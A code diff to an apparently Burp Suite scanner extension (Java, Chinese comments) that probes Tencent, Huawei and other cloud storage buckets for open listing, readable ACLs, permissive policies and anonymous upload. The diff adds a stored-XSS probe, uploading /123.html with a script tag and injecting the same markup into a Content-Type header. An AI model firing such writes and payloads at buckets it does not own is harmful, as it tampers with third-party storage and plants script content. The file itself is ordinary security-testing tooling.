@@ -9,6 +9,8 @@ import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.util.*;
 
+import static burp.Utils.Date_tidy.extractRequestUrl;
+
 public class Poc_Scan {
     //后续可以对针对不同的云存储写入不同的poc
     //例如
@@ -19,57 +21,60 @@ public class Poc_Scan {
 //            "GET /?policy HTTP/1.1",
 //            "GET /?policyStatus  HTTP/1.1",
 //    };
-//    private static final String[] tencent_poc = {};
-//    private static final String[] awsS3_poc = {};
-//    private static final String[] huawei_poc = {};
+//    private static final String[] tencent_poc = {
+//            "GET / HTTP/1.1",
+//            "GET /?acl HTTP/1.1",
+//            "PUT /123.txt HTTP/1.1",
+//            "GET /?policy HTTP/1.1",
+//    };
+//    private static final String[] awsS3_poc = {
+//            "GET / HTTP/1.1",
+//            "GET /?acl HTTP/1.1",
+//            "PUT /123.txt HTTP/1.1",
+//            "GET /?policy HTTP/1.1",
+//
+//    };
+//    private static final String[] huawei_poc = {
+//            "GET / HTTP/1.1",
+//            "GET /?acl HTTP/1.1",
+//            "PUT /123.txt HTTP/1.1",
+//            "GET /?policy HTTP/1.1",
+//    };
+//    private static final String[] ctyun_poc = {
+//            "GET / HTTP/1.1",
+//            "GET /?acl HTTP/1.1",
+//            "GET /?policy HTTP/1.1",
+//            "PUT /123.txt HTTP/1.1"
+//    };
     private static final String[] poc_HTTP = {
             "GET / HTTP/1.1",
             "GET /?acl HTTP/1.1",
             "GET /?policy HTTP/1.1",
-            "PUT /123.txt HTTP/1.1"
+            "PUT /123.html HTTP/1.1"
     };
     //去重
     private static Set<String> scannedHosts = Collections.synchronizedSet(new HashSet<>());
-    //    public static IHttpRequestResponse buildHttpServiceFromUrl(IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, HashMap CouldHashMap) {
-//        String host = null;
-//
-//            String requestString = "GET  / HTTP/1.1\r\nHost: " + host + "\r\nSec-Ch-Ua-Platform: \"Windows\""
-//                    +"\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\r\n"
-//                    +"\r\nConnection: keep-alive\r\n\r\n";
-//            String requestBody = "";
-//            byte[] requestBytes = requestString.getBytes(StandardCharsets.UTF_8);
-//            IRequestInfo analyzedRequest = helpers.analyzeRequest(requestBytes);
-//            List<String> headers = analyzedRequest.getHeaders();
-//            byte[] request = helpers.buildHttpMessage(headers, requestBody.getBytes(StandardCharsets.UTF_8));
-//
-//            // 构建HTTP服务
-//            IHttpService httpService = helpers.buildHttpService(host, 443, true);
-//            // 发送请求并获取响应
-//            IHttpRequestResponse response = callbacks.makeHttpRequest(httpService, request);
-//            int statusCode = getStatusCode(callbacks,response.getResponse());
-//            if (statusCode==200){
-//                return response;
-//            }else {
-//              return null;
-//            }
-//    }
-    public  static  RequestResponseWrapper buildHttpServiceFromUrl(IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, HashMap<String, ArrayList> CouldHashMap) {
+    public  static  RequestResponseWrapper buildHttpServiceFromUrl(IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, HashMap<String, ArrayList> CouldHashMap, IHttpRequestResponse messageInfo) {
         StringBuilder allMessages = new StringBuilder();
         IHttpRequestResponse finalResponse = null;  // 初始化最终响应
         String hosts=null;
+        boolean includePath=true;
+        String Referer = extractRequestUrl(messageInfo,includePath);
+
         //获取Map中所有的key
         for (String keys:CouldHashMap.keySet()) {
             List list = CouldHashMap.get(keys);
             for (Object host : list) {
                 if (!scannedHosts.contains(host)) { // 检查是否已经扫描过该主机名
                     scannedHosts.add((String) host); // 将主机名添加到已经扫描过的集合中
-                    if (keys != "Cloud_HuaWei") {
+                    if (keys != "Cloud_HuaWei" && keys != "Cloud_TengXun") {
                         for (int i = 0; i < poc_HTTP.length; i++) {
                             String requestString = poc_HTTP[i] + "\r\nHost: " + host + "\r\nSec-Ch-Ua-Platform: \"Windows\""
                                     + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\r\n"
-                                    + "\r\nConnection: keep-alive\r\n";
+                                    + "\r\nConnection: keep-alive\r\n"
+                                    + "\r\nReferer: "+ Referer +"\r\n";
                             // 添加请求体（如果有）
-                            String requestBody = i == 3 ? "123" : ""; // PUT 请求需要请求体
+                            String requestBody = i == 3 ? "<div style=\"display:none;\">Hidden Element</div><script>console.log('XSS Test');</script>" : ""; // PUT 请求需要请求体
                             byte[] requestBytes = requestString.getBytes(StandardCharsets.UTF_8);
                             IRequestInfo analyzedRequest = helpers.analyzeRequest(requestBytes);
                             List<String> headers = analyzedRequest.getHeaders();
@@ -102,7 +107,7 @@ public class Poc_Scan {
                                     finalResponse = response;
                                     hosts = (String) host;
                                     return new RequestResponseWrapper(finalResponse, allMessages.toString(), hosts);
-                                } else if (statusCode == 200 && poc_HTTP[i].equals("PUT /123.txt HTTP/1.1")) {
+                                } else if (statusCode == 200 && poc_HTTP[i].equals("PUT /123.html HTTP/1.1")) {
                                     allMessages.append("Bucket文件上传");
                                     finalResponse = response;
                                     hosts = (String) host;
@@ -113,11 +118,12 @@ public class Poc_Scan {
                                 throw new RuntimeException(e);
                             }
                         }
-                    } else {
+                    } else if (keys == "Cloud_HuaWei"){
                         for (int i = 0; i < poc_HTTP.length - 1; i++) {
                             String requestString = poc_HTTP[i] + "\r\nHost: " + host + "\r\nSec-Ch-Ua-Platform: \"Windows\""
                                     + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\r\n"
-                                    + "\r\nConnection: keep-alive\r\n";
+                                    + "\r\nConnection: keep-alive\r\n"
+                                    + "\r\nReferer: "+ Referer +"\r\n";;
                             String requestBody = "";
                             byte[] requestBytes = requestString.getBytes(StandardCharsets.UTF_8);
                             IRequestInfo analyzedRequest = helpers.analyzeRequest(requestBytes);
@@ -157,12 +163,63 @@ public class Poc_Scan {
                                 throw new RuntimeException(e);
                             }
                         }
+                    }else if (keys == "Cloud_TengXun"){
+                        //TODO 腾讯云
+                        for (int i = 0; i < poc_HTTP.length; i++) {
+                            String requestString = poc_HTTP[i] + "\r\nHost: " + host + "\r\nSec-Ch-Ua-Platform: \"Windows\""
+                                    + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\r\n"
+                                    + "\r\nConnection: keep-alive\r\n"
+                                    + "\r\nContent-Type: <div style=\"display:none;\">Hidden Element</div><script>console.log('XSS Test');</script>\r\n"
+                                    + "\r\nReferer: "+ Referer +"\r\n";
+                            // 添加请求体（如果有）
+                            String requestBody = i == 3 ? "<div style=\"display:none;\">Hidden Element</div><script>console.log('XSS Test');</script>" : "";  // PUT 请求需要请求体
+                            byte[] requestBytes = requestString.getBytes(StandardCharsets.UTF_8);
+                            IRequestInfo analyzedRequest = helpers.analyzeRequest(requestBytes);
+                            List<String> headers = analyzedRequest.getHeaders();
+                            byte[] request = helpers.buildHttpMessage(headers, requestBody.getBytes(StandardCharsets.UTF_8));
+                            // 构建HTTP服务
+                            IHttpService httpService = helpers.buildHttpService((String) host, 443, true);
+                            // 发送请求并获取响应
+                            IHttpRequestResponse response = callbacks.makeHttpRequest(httpService, request);
+                            int statusCode = getStatusCode(callbacks, response.getResponse());
+                            byte[] response1 = response.getResponse();
+                            try {
+                                String responseString = new String(response1, "UTF-8");
+                                if (statusCode == 200 && poc_HTTP[i].equals("GET / HTTP/1.1") && responseString.contains("</ListBucketResult>")) {
+                                    allMessages.append("Bucket遍历");
+                                    finalResponse = response;
+                                    hosts = (String) host;
+                                    return new RequestResponseWrapper(finalResponse, allMessages.toString(), hosts);
+                                } else if (statusCode == 200 && poc_HTTP[i].equals("GET /?acl HTTP/1.1") && responseString.contains("<AccessControlPolicy>")) {
+                                    allMessages.append("Bucket ACL可读");
+                                    finalResponse = response;
+                                    hosts = (String) host;
+                                    return new RequestResponseWrapper(finalResponse, allMessages.toString(), hosts);
+                                } else if (statusCode == 200 && poc_HTTP[i].equals("GET /?policy HTTP/1.1") && responseString.contains("\"Effect\": \"allow\"")) {
+                                    allMessages.append("Bucket 权限策略为允许");
+                                    finalResponse = response;
+                                    hosts = (String) host;
+                                    return new RequestResponseWrapper(finalResponse, allMessages.toString(), hosts);
+                                } else if (statusCode == 200 && poc_HTTP[i].equals("PUT /123.html HTTP/1.1")) {
+                                    allMessages.append("Bucket文件上传,可能存在xss漏洞，F12查看控制台XSS Test");
+                                    finalResponse = response;
+                                    hosts = (String) host;
+                                    return new RequestResponseWrapper(finalResponse, allMessages.toString(), hosts);
+                                }
+
+                            } catch (UnsupportedEncodingException e) {
+                                throw new RuntimeException(e);
+                            }
+                        }
+
                     }
                 }
             }
         }
         return new RequestResponseWrapper(null, "", null);
     }
+
+    //主动扫描
     public  static  RequestResponseWrapper hostScan(IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers,String host) {
         String hostName = host;
         int port = 443; // 默认HTTPS端口
